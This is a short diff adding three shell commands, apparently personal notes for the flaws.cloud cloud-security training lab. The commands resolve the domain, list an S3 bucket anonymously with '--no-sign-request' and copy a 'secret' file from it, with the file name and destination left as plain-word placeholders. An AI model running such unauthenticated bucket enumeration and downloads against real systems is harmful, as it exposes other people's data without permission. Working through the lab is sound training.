@@ -1,0 +1,3 @@
+nslookup flaws.cloud
+aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
+aws s3 cp s3://flaws.cloud/secret(whatever was in here) (directory to my desktop) --no-sign-request --region us-west-2
